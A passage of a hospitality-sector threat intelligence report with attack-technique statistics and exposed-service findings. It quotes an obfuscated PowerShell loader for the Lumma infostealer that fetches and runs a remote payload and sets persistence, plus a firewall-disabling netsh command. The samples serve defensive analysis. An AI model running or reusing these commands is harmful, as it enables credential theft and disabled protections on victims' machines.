# 2025 Trustwave Risk Radar Report: Hospitality Sector

## Table of Contents
- [Persistent Threat Landscape in the Hospitality Sector](#persistent-threat-landscape-in-the-hospitality-sector)
- [Hospitality’s Unique Threat Landscape](#hospitalitys-unique-threat-landscape)
  - [Seasonal and Less Sophisticated Workforce](#seasonal-and-less-sophisticated-workforce)
  - [Constant User/Guest Turnover](#constant-userguest-turnover)
  - [Dirty Networks](#dirty-networks)
  - [Physical Security Concerns](#physical-security-concerns)
  - [Franchise Model](#franchise-model)
- [Notable and Prominent Trends in Hospitality](#notable-and-prominent-trends-in-hospitality)
  - [Fraudsters Study and Share Booking Platform Secrets](#fraudsters-study-and-share-booking-platform-secrets)
  - [Dark Web Travel Agents](#dark-web-travel-agents)
  - [Publicly Exposed Services](#publicly-exposed-services)
- [Threat Actor Techniques by Attack Stage](#threat-actor-techniques-by-attack-stage)
  - [Credential Access Techniques](#credential-access-techniques)
  - [Execution Techniques](#execution-techniques)
  - [Initial Access Techniques](#initial-access-techniques)
  - [Privilege Escalation techniques](#privilege-escalation-techniques)
  - [Discovery Techniques](#discovery-techniques)
  - [Command and Control Techniques](#command-and-control-techniques)
  - [Defense Evasion Techniques](#defense-evasion-techniques)
  - [Persistence Techniques](#persistence-techniques)
  - [Lateral Movement Techniques](#lateral-movement-techniques)
- [Publicly Exposed Services in Hospitality](#publicly-exposed-services-in-hospitality)
  - [Top 10 Exposed Ports](#top-10-exposed-ports)
    - [Port 161 (SNMP)](#port-161-snmp)
    - [Port 123 (NTP)](#port-123-ntp)
    - [Ports 443 / 8443 (HTTPS / Alt HTTPS)](#ports-443--8443-https--alt-https)
    - [Port 80 (HTTP)](#port-80-http)
    - [Port 22 (SSH)](#port-22-ssh)
    - [Port 2628 (DICT Protocol)](#port-2628-dict-protocol)
    - [Port 179 (BGP)](#port-179-bgp)
    - [Port 2000 (Cisco SCCP)](#port-2000-cisco-sccp)
    - [Port 53 (DNS)](#port-53-dns)
  - [Key Applications in Hospitality with Notable Vulnerabilities](#key-applications-in-hospitality-with-notable-vulnerabilities)
    - [OpenSSH](#openssh)
    - [Apache httpd](#apache-httpd)
    - [Microsoft IIS httpd](#microsoft-iis-httpd)
    - [MariaDB](#mariadb)
    - [MikroTik Bandwidth-Test Server](#mikrotik-bandwidth-test-server)
    - [nginx](#nginx)
    - [ntpd](#ntpd)
    - [ciscoSystems](#ciscosystems)
    - [PPTP](#pptp)
- [Conclusion & Key Takeaways](#conclusion--key-takeaways)
  - [Conclusion](#conclusion)
  - [Key Takeaways for the Hospitality Sector](#key-takeaways-for-the-hospitality-sector)
    - [Inventory, Assess, and Patch](#inventory-assess-and-patch)
    - [Strengthen Identity and Access Controls](#strengthen-identity-and-access-controls)
    - [Monitor and Control Remote Access Tools](#monitor-and-control-remote-access-tools)
    - [Secure Third-Party and Supply Chain Relationships](#secure-third-party-and-supply-chain-relationships)
    - [Backups and Business Continuity](#backups-and-business-continuity)
    - [Raise Internal Awareness and Training](#raise-internal-awareness-and-training)
    - [Monitor the Threat Landscape](#monitor-the-threat-landscape)

The hospitality industry plays a critical role in the global economy, encompassing a wide range of services including lodging, food and beverage, travel, tourism, and event planning. With millions of travelers and guests interacting with hospitality services daily, the sector handles vast amounts of sensitive personal and financial information.

The Trustwave SpiderLabs team has conducted in-depth analysis of emerging cyber threat tactics, identifying the key trends reshaping the hospitality industry’s risk profile. Building upon our previously published work, the 2023 Hospitality Sector Threat Landscape, our researchers have structured their new findings into a comprehensive breakdown of attack stages, providing hospitality organizations with actionable intelligence they can use to strengthen their defensive posture.

This includes payment card details, passport and ID numbers, travel itineraries, and even health-related data. To meet guest expectations for convenience and connectivity, hospitality businesses increasingly rely on digital technologies, cloud-based services, IoT devices, and mobile platforms.

In addition, Trustwave SpiderLabs has produced two detailed supplemental reports:

- Hospitality Sector Deep Dive: A DFIR Case Study
- Hospitality Sector Deep Dive: How Threat Actors Turn Vulnerabilities into Big Business

While these innovations enhance the guest experience, they also expand the industry’s attack surface, making it an attractive target for cybercriminals.

Cybersecurity in the hospitality sector has emerged as a pressing concern in recent years. Hotels, resorts, and travel service providers are often underprepared for the sophistication and persistence of modern cyber threats. The decentralized nature of operations, frequent staff turnover, and reliance on third-party vendors further compound the risk. Threat actors exploit these weaknesses through a variety of tactics, including ransomware attacks, social engineering schemes, data breaches, and attacks on IoT infrastructure.

The consequences of successful cyberattacks in hospitality are significant, ranging from operational disruptions and financial losses to reputational damage and regulatory penalties.

### Key Report Findings for the Hospitality Sector

- **2x** the volume of public-facing SNMP services compared to the next most frequently exposed service
- **~15K** critical vulnerabilities exposed to public Internet
- **61.5%** of initial access attempted to exploit publicly exposed services

# Persistent Threat Landscape in the Hospitality Sector

Hospitality vendors face security threats from every angle. Here are just a few of the major headlines over the past two years:

- How ‘Juice Jackers’ Plant Malware On Your Phone At Airports And Hotels - Forbes, April 20, 2023
- Caesars Entertainment Discloses Cyber Attack, Ransom Payment Made Weeks Before MGM Heist - CPO Magazine, Sept. 19, 2023
- Unsaflok Flaw Can Let Hackers Unlock Millions of Hotel Doors - Bleeping Computer, March 21, 2024
- Vulnerability Exposed Ibis Budget Guest Room Codes to Hackers - Hack Read, April 2, 2024
- Omni Hotels Says Personal Information Stolen in Ransomware Attack - Security Week, April 16, 2024
- Exclusive: Watergategate? Ransomware gang targets famous Watergate Hotel - Cyber Daily, May 1, 2024
- US Hotel Check-In Systems Infiltrated by Spyware App - SC Media, May 23, 2024
- Hotel Check-in Kiosks Expose Guest Data, Room Keys - Dark Reading, June 8, 2024
- Disney Data Breach: Disneyland, Disney Cruise Guests’ and Employee’s Personal Info Leaked - Mashable, Sept. 8, 2024
- Radisson’s Country Inn & Suites Purportedly Breached by Everest Ransomware - SC Media, Oct. 22, 2024
- Gambling Sector Subjected to APT41 Intrusions - SC Media, Oct. 22, 2024
- Gambling and Lottery Giant Disrupted by Cyberattack, Working to Bring Systems Back Online - The Record, Nov. 22, 2024
- Cyberattack Shuts Down Upper Peninsula’s Kewadin Casinos, Tribal Operations - Detroit Free Press, Feb. 12, 2025
- Microsoft Warns of ClickFix Phishing Campaign Targeting Hospitality Sector via Fake Booking[.]com Emails - The Hacker News, March 13, 2025

# Hospitality’s Unique Threat Landscape

The hospitality industry faces unique challenges that many other industries don’t face. This list should serve to alert you to specific areas where you may want to focus on when you begin closing your risk gap.

## Seasonal and Less Sophisticated Workforce

The hospitality sector employs a diverse workforce, with seasonal and less sophisticated staff often engaged during peak periods to meet demand. This turnover presents a distinct risk of insider threat, intentional or not, due to the challenge of providing consistent security training to a continually changing group of employees.

## Constant User/Guest Turnover

Hospitality establishments encounter a fresh set of users virtually every day. This ongoing cycle demands consistent uptime, addresses bandwidth constraints, and strives to minimize potential exposure to security threats.

## Dirty Networks

Given the substantial volume of network users, whether they’re hotel guests or individuals connecting to coffee shop Wi-Fi, organizations within the hospitality sector must operate under the assumption that their networks are highly susceptible to attacks due to the sheer number of untrusted users.

## Physical Security Concerns

Unlike conventional office buildings where employee access is typically controlled through access cards, hospitality establishments face cybersecurity risks due to the accessibility of hardware by guests. For instance, the server closet in a hotel could be left unlocked and easily accessible, or a thumb drive could easily be inserted into a nearby device.

## Franchise Model

The franchise framework leads to disparities in policy consistency and implementation across the industry, including cybersecurity measures. Different franchisers and franchisees adopt varied business models, resulting in divergent cybersecurity practices. Providing guidance or security requirements can be a sensitive issue between the franchisers and franchisees.

With more than 250 cybersecurity experts across the globe, the Trustwave SpiderLabs team puts its resources to task researching the top threats in today’s landscape. We are uniquely positioned to do so, as we perform over 200,000 hours of penetration tests and discover over 30,000 vulnerabilities annually, including 9,000 high/critical severity infrastructure and web app sources. We also have a dedicated email security team analyzing millions of phishing URLs validated daily, including 2M+ per month that are uniquely identified by Trustwave SpiderLabs. Our diverse coverage of infosec disciplines, including Advanced Continuous Threat Hunting, Digital Forensics and Incident Response, Malware Reversal, and Database Security, give us insight into identifying how these breaches occur, as well as mitigations and controls that your organization can put in place to prevent these compromises.

This report examines the myriads of threats facing the hospitality industry. In addition to supplemental reports focused on the rapid rise of ransomware and common security gaps, Trustwave SpiderLabs will offer recommendations to help hospitality organizations mitigate risks and keep their operations undisrupted.

# Notable and Prominent Trends in Hospitality

From Trustwave’s global perspective we’ve picked a few trends that could be going under the radar for your security team.

## Fraudsters Study and Share Booking Platform Secrets

### The Threat

In underground forums, Telegram groups, and private marketplaces, cybercriminals are actively collaborating, sharing guides, and trading access on how to exploit major booking platforms.

Hackers also often share detailed tutorials on how to insert stolen credit card data into active bookings, bypass verification checks, and avoid detection.

### Mitigations to Reduce Risk

Without aggressive fraud detection, closer vetting of partners, and cross-platform intelligence sharing, the hospitality industry remains vulnerable to a coordinated wave of booking abuse.

Monitoring the dark web and underground forums for “chatter” about your brand can help mitigate this issue and alert the hospitality organization of potential issues with their booking portal.

![An educational article about hotel booking types on a dark web forum](image_1.png)

## Dark Web Travel Agents

### The Threat

Some malicious operators have been reportedly active on the dark web since 2018, offering heavily discounted “all-in-one” travel packages, claiming savings of 50 to 70% on hotel bookings, international flights, car rentals, and even guided excursions.

These underground “travel agencies” promise their customers everything from luxury hotel stays and business-class flights to full holiday itineraries at a fraction of the market price. While the pricing may sound too good to be true, the market for such services has grown steadily, with clients ranging from cybercriminals to individuals simply looking for a cheap getaway, knowingly or unknowingly participating in fraudulent activity.

![The landing page of a dark web-advertised travel agency](image_2.png)

### Mitigations to Reduce Risk

Although these groups do not openly disclose how they operate, their modus operandi likely involves using stolen credit card data, compromised loyalty accounts, or hijacked admin access to travel and booking platforms.

Just like when fraudsters share tips on exploiting a booking system, fraud detection, supply chain vetting, and threat intelligence sharing are the recipes to prevent financial and reputation loss through this fraud.

Monitoring the dark web and underground forums for “chatter” about your brand can help mitigate this issue and alert the hospitality organization of fraudulent sales.

## Publicly Exposed Services

### The Threat

Research and analysis of publicly exposed services in the hospitality sector reveals a massive attack surface.

In April 2025, a total of 95,040 vulnerabilities were discovered with 3,884 unique CVEs for these hospitality companies. There were 14,318 critical vulnerabilities and 1,521 vulnerabilities in the CISA list. SNMP was exposed twice as much as the next highest publicly exposed service. SNMP can be a goldmine for hackers as vulnerabilities and misconfigurations are often plentiful in these environments.

Based on metrics from our own customer base, 61.5% of initial access attempts exploit publicly exposed services.

### Mitigations to Reduce Risk

- **Enhance Cybersecurity Hygiene and Patch Management**: Unpatched vulnerabilities are low-hanging fruit for threat actors. Don’t make it easy for these criminals. Hospitality organizations should ensure that all systems are regularly updated with the latest security patches. The CISA Known Exploited Vulnerabilities (KEV) catalog is a useful resource for identifying and prioritizing patches for critical systems.
- **Employ Network and Host-Based Auditing**: Auditing can provide an early warning of a compromise and an important trail for incident responders in the case of a compromise.
- **Incident Response Planning**: A comprehensive incident response plan is essential to minimizing the impact of any attack. This plan should include clear steps for containing and mitigating the attack, restoring systems, and communicating with stakeholders. Hospitality organizations should test their incident response plans through tabletop exercises and ensure that external cybersecurity experts are ready to assist if needed.

# Threat Actor Techniques by Attack Stage

Credential Access techniques observed in the attacks relied mostly on brute-force attempts and generic brute-force attacks. Activities related to the modifications of the authentication process involved disabling multi-factor authentication (MFA). OS credential dumping by using DCSync and NTLM hash theft were also observed.

All Credential Access techniques have fallen in volume, while Brute Force attempts have increased about 14% since our last Hospitality Threat Report. Since this category also includes Credential Stuffing and Dictionary Attacks, it makes sense that it would still be at the top. Massive credential dumps from compromised organizations seem to drop every day, providing threat actors with instant access, often due to password reuse.

## Credential Access Techniques

- Brute Force T1110: 95.4%
- Modify Authentication Process T1556: 3.6%
- OS Credential Dumping T1003: 0.9%
- Forced Authentication T1178: 0.1%

## Execution Techniques

Execution techniques observed in the security incidents primarily involved the user execution of malicious files and links, followed by malicious uses of PowerShell scripts and commands. Some of the commands were executed remotely via remote Windows Management Instrumentation (WMI) service.

- User Execution T1204: 58.7%
- Command and Scripting Interpreter T1059: 37%
- Windows Management Instrumentation T1047: 2.5%
- Scheduled Task/Job T1053: 1.8%

The example script below was executed when a user tried to install a free version of ThunderSoft screen recorder, which, in fact, was an instance of Lumma infostealer.

```
$5vhslS6M=’https[://]softz[.]b-cdn.net/soft111[.]
z i p’;$ y 6l L K X q Q = $ e n v: A P P D A T A +’\ L Y G t m 2 H M’;
$ u K 9 7 o 3 5 m = $ e n v : A P P D A T A +’\ z I B b f g 2 d .z i p ’;
$bReTCOPB=$y6lLKXqQ+’\ThunderSoft.exe’;  if  (-not
(TESt-paTH $y6lLKXqQ)) { nEw-ITeM -Path $y6lLKXqQ
-ItemType Directory }; STaRt-biTStRANSFer -Source
$5vhslS6M  -Destination  $uK97o35m;  exPand-ARchivE
-Path $uK97o35m -DestinationPath $y6lLKXqQ -Force;
RemoVE-ITeM  $uK97o35m;  STaRt-pROCesS  $bReTCOPB;
NEw-ItEmPROPErTy  -Path  ‘HKCU:\SOFTWARE\Microsoft\
Windows\CurrentVersion\Run’ -Name ‘suYKZtOX’ -Value
$bReTCOPB -PropertyType ‘String’;
```

## Initial Access Techniques

Initial Access vectors used in the attacks were mainly exploit attempts against publicly accessible services, followed by phishing and the use of compromised accounts. Most phishing attempts were generic and leveraged social engineering with links to external websites.

- Exploit Public-Facing Application T1190: 61.5%
- Phishing T1566: 23.4%
- Valid Accounts T1078: 15.1%

Compared to our last hospitality threat report, attempts to exploit Apache Log4J have remained basically flat and still represent nearly half of all exploit attempts.

The exploit techniques identified in the initial access attempts targeting web applications primarily included Log4j CVE-2021-44228, which represented 49% of the cases observed.

This is likely due to the ease of exploitation and threat actors searching for the previously mentioned “low hanging fruit” issues.

Another widely targeted type of vulnerability was cross-site scripting, which accounted for 26% of records. Meanwhile, SQL injection and directory traversal made up 20.2% of the cases. Notably, some attackers also tried to leverage CVE-2020-1472, (Zerologon) and CVE-2021-26897 (a remote code execution vulnerability in Windows DNS server).

Other attacks like SQL Injection have increased in frequency, sometimes up to double, which suggests that these stalwart attacks are tried and true. We also see some vulnerabilities that were very popular for exploitation just a couple of years ago completely fall off the chart.

For instance, exploiting the MOVEit Transfer Vulnerability (CVE-2023-34362) has fallen off the list entirely. While that suggests that the vulnerability is being patched, you can see that some vulnerabilities exploited are over a decade old. So, administrators still need to prioritize agile patching.

### Exploit Public-Facing Application

- CVE-2021-44228 Apache Log4J: 49%
- Cross-Site Scripting: 26%
- Directory Traversal Request Attempt: 20%
- SQL Injection: 20%
- CVE-2020-1472 Possible ZeroLogon attempt: 2%
- CVE-2012-0158: 1%
- CVE-2021-26897 Windows DNS Server Remote Code Execution Vulnerability: 1%
- Java Object Deserialization: 1%
- Remote Stack Overflow Vulnerability: 1%

## Privilege Escalation techniques

Privilege Escalation techniques utilized by attackers relied on the manipulation of valid cloud-based accounts to escalate to a higher privileged role.

- Account Manipulation T1098: 73.7%
- Valid Accounts T1078: 24.6%
- Abuse Elevation Control Mechanism T1548: 1.8%

## Discovery Techniques

Discovery techniques utilized by attackers relied mostly on account and network service discovery.

- Network Service Discovery T1046: 84%
- Account Discovery T1087: 8.6%
- Network Share Discovery T1135: 6.7%
- System Network Configuration Discovery T1016: 0.6%

## Command and Control Techniques

Command and Control techniques observed in the security incidents were mostly based on communication to web services over HTTP(S) protocol as well as with the use of proxy (i.e., communication over TOR network). Another Application Layer Protocols identified in the command-and-control traffic include DNS and SMB.

- Web Service: 36.5%
- Proxy T1090: 29.4%
- Application Layer Protocol T1071: 23%
- Ingress Tool Transfer T1105: 11.1%

## Defense Evasion Techniques

Defense Evasion techniques in the analyzed security incidents generally utilized access token manipulation and process names masquerading. Attackers attempted to impair defenses by disabling local security software such as firewalls. A common target of process injections was the Windows native explorer.exe process.

- Access Token Manipulation T1134: 43.7%
- Masquerading T1036: 33.8%
- Impair Defenses T1562: 14.1%
- Process Injection T1055: 8.5%

Selected examples of malicious commands observed: firewall disablement

```
netsh advfirewall set allprofiles state off
```

## Persistence Techniques

Persistence techniques utilized by attackers relied mostly on Account Creation, but also other techniques such as event-triggered execution, execution upon system start, as well as abuse of legitimate server software components.

- Create Account T1136: 89.3%
- Event Triggered Execution T1546: 5.4%
- Boot or Logon Autostart Execution T1547: 3.6%
- Server Software Component T1505: 1.8%

## Lateral Movement Techniques

Lateral Movement techniques utilized by attackers relied mostly on remote services, specifically Server Message Block (SMB) and the use of alternate authentication material via pass-the-ticket attacks.

- Remote Services T1021: 85.2%
- Use Alternate Authentication Material T1550: 13%

# Publicly Exposed Services in Hospitality

Services are often publicly exposed for a good reason. To allow the public to visit your website, and to receive email from people outside your organization. However, there are many times when services are made public that should not be.

Compared to our previous hospitality report, the metrics have not changed much. There were 62,565 publicly exposed hospitality systems in 2024 compared to our last report, which showed about 65,642 exposed systems, a small decrease of 4.6%. Other metrics were also similar, including the same top three open services and only minor differences in the number of vulnerabilities found.

As of April 2025, 95,040 vulnerabilities were discovered with 3,884 unique CVEs for the hospitality sector. Among these, 14,318 are critical vulnerabilities and 1,521 are vulnerabilities in the CISA KEV list.

This is a large number of exposed vulnerabilities, especially considering the number of exposed hosts. For instance, in this year’s Manufacturing Industry threat report, Trustwave found 166,188 publicly exposed hosts compared to the 62,565 we found in hospitality.

Despite the nearly threefold number of exposed devices, the Manufacturing Industry had only 24,920 exposed vulnerabilities, almost four times less than the hospitality sector.

This is likely due to the number of public-facing assets necessary for the hospitality industry. Essential services like booking portals, room check-in, and restaurant hours and menus necessitate more publicly available resources.

Organizations should take an inventory of open services outside the perimeter and audit whether access is in fact being properly controlled. It’s also essential to prioritize patching for any publicly exposed systems.

## Top 10 Exposed Ports

In any industry, you will have to expose certain services like VPN endpoint for remote employees and your mail server to send and receive email. However, most organizations are overexposed and leave services exposed that should be placed inside the network perimeter. Following are the top 10 exposed ports in the hospitality sector, the service behind the port, and the potential risk of having the port open to the public.

![Bar chart showing the count of top 10 exposed ports. Port 161 has the highest count at 9627, followed by 123 at 5525, 443 at 4474, 80 at 4372, 22 at 2402, 2628 at 2178, 179 at 1967, 2000 at 1914, 53 at 1130, and 8443 at 1964.](image_3.png)

### Port 161 (SNMP)

Count: 9,627

Usage: SNMP is used to monitor and manage hotel systems like HVAC, lighting, IP cameras, and building management systems (BMS).

Vulnerabilities:

- Unauthorized Access: Weak or default SNMP community strings can allow attackers to manipulate infrastructure.
- Data Exposure: SNMP versions 1 and 2c transmit in plaintext.

### Port 123 (NTP)

Count: 5,525

Usage: Used to synchronize clocks on systems like keycard readers, access control, and server logs.

Vulnerabilities:

- DDoS Amplification: Exposed NTP services can be used in reflection-based DDoS attacks.

### Ports 443 / 8443 (HTTPS / Alt HTTPS)

Combined Count: 6,438 (443: 4474, 8443: 1964)

Usage: Secure communication for booking portals, guest Wi-Fi login pages, and hotel admin systems.

Vulnerabilities:

- Expired or self-signed certificates.
- Weak TLS configurations.
- Exposed admin interfaces on port 8443

Real-World Example: In 2024, Otelier (a hotel software vendor) experienced a breach exposing guest data due to credential compromise affecting hotel systems globally.

### Port 80 (HTTP)

Count: 4,372

Usage: Unencrypted access to legacy sites, admin interfaces, and internal hotel apps.

Vulnerabilities:

- Data interception (no encryption).
- Credential theft from exposed login forms

Real-World Example: In 2024, Otelier’s breach also highlighted risks associated with unencrypted internal interfaces, including exposed web dashboards using HTTP.

### Port 22 (SSH)

Count: 2,402

Usage: Secure remote login for hotel IT teams managing POS systems, CCTV, and infrastructure.

Vulnerabilities:

- Brute-force login attempts.
- Weak SSH key management.

### Port 2628 (DICT Protocol)

Count: 2,178

Usage: Legacy dictionary